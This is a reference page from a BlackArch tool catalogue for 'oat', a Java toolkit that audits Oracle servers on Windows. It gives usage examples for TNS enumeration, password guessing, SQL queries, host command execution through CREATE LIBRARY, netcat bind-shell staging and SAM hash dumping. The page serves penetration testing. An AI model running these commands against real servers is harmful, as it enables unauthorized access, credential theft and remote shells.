---
name: "oat"
categories:
  - blackarch-fuzzer
version: "1.3.1"
homepage: "http://www.cqure.net/wp/test/"
packaged-by: [blackarch]
blackarch-builddate: "2025-12-19"
build-system: scripts
license: GPL-2.0-or-later
meta-checked: "2026-11-09"
worth: 0.4
worth-basis: "adoption-only (no upstream data)"
worth-checked: "2026-11-09"
---

# oat

> Java toolkit for auditing Oracle servers on Windows: TNS listener enumeration, password guessing, SQL queries, SAM dumps, and remote command execution through CREATE LIBRARY.

*No corpus evidence — derived from upstream documentation.*

## What it's for

The Oracle Auditing Tools (Patrik Karlsson, cqure.net) audit Oracle database servers running on Microsoft Windows. After authenticating with a database account, they abuse the SQL `CREATE LIBRARY` statement to reach `WinExec` in kernel32.dll, so any sufficiently privileged account can execute commands on the host as the Oracle service account. The suite ships five commands: `otnsctl` (query the TNS listener like a limited lsnrctl — services, status, version), `opwg` (password guessing with user/password lists plus built-in default-account checks), `oquery` (run SQL and format the result set), `ose` (interactive or automatic command execution — automatic mode TFTPs netcat over the toolkit's built-in TFTP server and binds a shell on TCP 31337), and `osd` (TFTP a pwdump2 binary to the server and dump the SAM). The tools are Java-based and require the Oracle JDBC driver (classes12.zip or classes111.zip) on the classpath. They only work against Oracle on Windows — the execution path is a Win32 API call.

## Typical use cases

### Enumerate the TNS listener

Discover SIDs and services before attacking the database.

```
otnsctl -s 198.51.100.10 -c services
```

Outcome: queries the TNS listener and prints the services it exposes (`-c status` or `-c version` for other views, `-I` for an interactive prompt); this is also the fallback for finding SIDs when the automatic SID resolution in other tools fails.

### Guess passwords, including default accounts

Check a password list plus the known default accounts.

```
opwg -s 198.51.100.10 -d ORCL -u users.txt -p passwords.txt
```

Outcome: attempts each user/password combination against SID `ORCL` and prints the credentials that authenticate; the built-in default-account checks run as well unless disabled with `-D`.

### Run SQL with recovered credentials

Verify what an account can read and do.

```
oquery -s 198.51.100.10 -d ORCL -u user -p Password1 -v
```

Outcome: connects as the given user and lets you submit SQL statements, formatting returned result sets; `-v` prints verbose connection details.

### Execute a command on the database host

Turn a privileged SQL account into host command execution.

```
ose -s 198.51.100.10 -d ORCL -u user -p Password1 -l 198.51.100.20
```

Outcome: uses CREATE LIBRARY to execute commands through WinExec as the Oracle service account; `-l` sets the local IP for the built-in TFTP server used to stage binaries — in automatic mode the tool pushes netcat and binds a shell on TCP 31337. `osd` uses the same staging path to run pwdump2 and retrieve the SAM hashes.
